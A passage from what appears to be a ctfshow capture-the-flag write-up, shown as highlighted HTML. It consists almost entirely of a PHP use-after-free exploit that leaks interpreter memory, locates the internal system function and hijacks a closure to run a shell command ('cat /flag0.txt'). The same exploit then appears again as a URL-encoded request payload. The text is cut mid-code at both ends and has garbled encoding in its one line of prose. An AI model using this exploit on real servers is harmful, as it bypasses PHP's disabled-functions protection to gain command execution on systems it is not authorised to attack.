&#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flag0.txt&quot;</span>);<span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>äºæ˜¯payloadå°±æ˜¯ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="function"><span class="keyword">function</span>%20<span class="title">ctfshow</span>(<span class="params">%<span class="number">24</span>cmd</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20<span class="title">global</span>%20%24<span class="title">abc</span>%2<span class="title">C</span>%20%24<span class="title">helper</span>%2<span class="title">C</span>%20%24<span class="title">backtrace</span>%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">class</span>%20<span class="title">Vuln</span>%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">public</span>%20%24<span class="title">a</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">public</span>%20<span class="title">function</span>%20<span class="title">__destruct</span>(<span class="params"></span>)%20%7<span class="title">B</span>%20%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">global</span>%20%24<span class="title">backtrace</span>%3<span class="title">B</span>%20%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">unset</span>(<span class="params">%<span class="number">24</span>this-%<span class="number">3</span>Ea</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">backtrace</span>%20%3<span class="title">D</span>%20(<span class="params"><span class="keyword">new</span>%<span class="number">20</span><span class="built_in">Exception</span></span>)-%3<span class="title">EgetTrace</span>(<span class="params"></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">if</span>(<span class="params">!<span class="keyword">isset</span>(<span class="params">%<span class="number">24</span>backtrace%<span class="number">5</span>B1%<span class="number">5</span>D%<span class="number">5</span>B<span class="string">&#x27;args&#x27;</span>%<span class="number">5</span>D</span>)</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">backtrace</span>%20%3<span class="title">D</span>%20<span class="title">debug_backtrace</span>(<span class="params"></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">class</span>%20<span class="title">Helper</span>%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">public</span>%20%24<span class="title">a</span>%2<span class="title">C</span>%20%24<span class="title">b</span>%2<span class="title">C</span>%20%24<span class="title">c</span>%2<span class="title">C</span>%20%24<span class="title">d</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">function</span>%20<span class="title">str2ptr</span>(<span class="params">%<span class="number">26</span>%<span class="number">24</span>str%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>p%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">200</span>%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>s%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">208</span></span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">address</span>%20%3<span class="title">D</span>%200%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">for</span>(<span class="params">%<span class="number">24</span>j%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">24</span>s-<span class="number">1</span>%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>j%<span class="number">20</span>%<span class="number">3</span>E%<span class="number">3</span>D%<span class="number">200</span>%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>j--</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">address</span>%20%3<span class="title">C</span>%3<span class="title">C</span>%3<span class="title">D</span>%208%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">address</span>%20%7<span class="title">C</span>%3<span class="title">D</span>%20<span class="title">ord</span>(<span class="params">%<span class="number">24</span>str%<span class="number">5</span>B%<span class="number">24</span>p%<span class="number">2</span>B%<span class="number">24</span>j%<span class="number">5</span>D</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">return</span>%20%24<span class="title">address</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">function</span>%20<span class="title">ptr2str</span>(<span class="params">%<span class="number">24</span>ptr%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>m%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">208</span></span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">out</span>%20%3<span class="title">D</span>%20%22%22%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">for</span>%20(<span class="params">%<span class="number">24</span>i%<span class="number">3</span>D0%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>C%<span class="number">20</span>%<span class="number">24</span>m%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">2</span>B%<span class="number">2</span>B</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">out</span>%20.%3<span class="title">D</span>%20<span class="title">sprintf</span>(<span class="params">%<span class="number">22</span>%<span class="number">25</span>c%<span class="number">22</span>%<span class="number">2</span>C(<span class="params">%<span class="number">24</span>ptr%<span class="number">20</span>%<span class="number">26</span>%<span class="number">200</span>xff</span>)</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">ptr</span>%20%3<span class="title">E</span>%3<span class="title">E</span>%3<span class="title">D</span>%208%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">return</span>%20%24<span class="title">out</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">function</span>%20<span class="title">write</span>(<span class="params">%<span class="number">26</span>%<span class="number">24</span>str%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>p%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>v%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>n%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">208</span></span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">i</span>%20%3<span class="title">D</span>%200%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">for</span>(<span class="params">%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">200</span>%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>C%<span class="number">20</span>%<span class="number">24</span>n%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">2</span>B%<span class="number">2</span>B</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">str</span>%5<span class="title">B</span>%24<span class="title">p</span>%20%2<span class="title">B</span>%20%24<span class="title">i</span>%5<span class="title">D</span>%20%3<span class="title">D</span>%20<span class="title">sprintf</span>(<span class="params">%<span class="number">22</span>%<span class="number">25</span>c%<span class="number">22</span>%<span class="number">2</span>C(<span class="params">%<span class="number">24</span>v%<span class="number">20</span>%<span class="number">26</span>%<span class="number">200</span>xff</span>)</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">v</span>%20%3<span class="title">E</span>%3<span class="title">E</span>%3<span class="title">D</span>%208%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">function</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>addr%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>p%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">200</span>%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>s%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">208</span></span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">global</span>%20%24<span class="title">abc</span>%2<span class="title">C</span>%20%24<span class="title">helper</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">write</span>(<span class="params">%<span class="number">24</span>abc%<span class="number">2</span>C%<span class="number">200</span>x68%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>addr%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">20</span>%<span class="number">24</span>p%<span class="number">20</span>-%<span class="number">200</span>x10</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">leak</span>%20%3<span class="title">D</span>%20<span class="title">strlen</span>(<span class="params">%<span class="number">24</span>helper-%<span class="number">3</span>Ea</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">if</span>(<span class="params">%<span class="number">24</span>s%<span class="number">20</span>!%<span class="number">3</span>D%<span class="number">208</span></span>)%20%7<span class="title">B</span>%20%24<span class="title">leak</span>%20%25%3<span class="title">D</span>%202%20%3<span class="title">C</span>%3<span class="title">C</span>%20(<span class="params">%<span class="number">24</span>s%<span class="number">20</span>*%<span class="number">208</span></span>)%20-%201%3<span class="title">B</span>%20%7<span class="title">D</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">return</span>%20%24<span class="title">leak</span>%3<span class="title">B</span>%0<span 